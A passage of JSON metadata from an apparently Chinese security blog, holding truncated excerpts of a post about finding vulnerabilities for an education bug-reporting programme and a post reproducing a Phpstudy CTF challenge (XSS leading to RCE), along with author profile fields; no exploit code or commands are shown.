前言小白初入渗透，想获得一个教育SRC的漏洞证书，觉得某州学院是比较好看的，而且只需要10rank，不是很多，对我这个小白很友好，因此就开始了本次的渗透之路（意外的收获了小通杀）。 目...","link":"","photos":[],"count_time":{"symbolsCount":"4.5k","symbolsTime":"4 mins."},"categories":[{"name":"渗透","slug":"渗透","count":2,"path":"api/categories/渗透.json"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","count":1,"path":"api/tags/漏洞挖掘.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"部分CTF赛题复现","uid":"7dcc2ac2a5074f9dfc556173516085db","slug":"部分CTF题目复现","date":"2023-04-20T07:02:30.000Z","updated":"2023-06-13T17:56:06.000Z","comments":true,"path":"api/articles/部分CTF题目复现.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304211547570.png","text":"春秋杯Phpstudy之前并未复现这个漏洞，只知道是一个XSS导致的RCE，在比赛时没有思路，现进行复现。 搭建环境使用Windows，在官网https://www.xp.cn/windows-panel.html安装完小皮面板安装包后，拖入虚拟机进行安装即可 安装完后我们需要修...","link":"","photos":[],"count_time":{"symbolsCount":"6.9k","symbolsTime":"6 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"CTF","slug":"CTF","count":4,"path":"api/tags/CTF.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}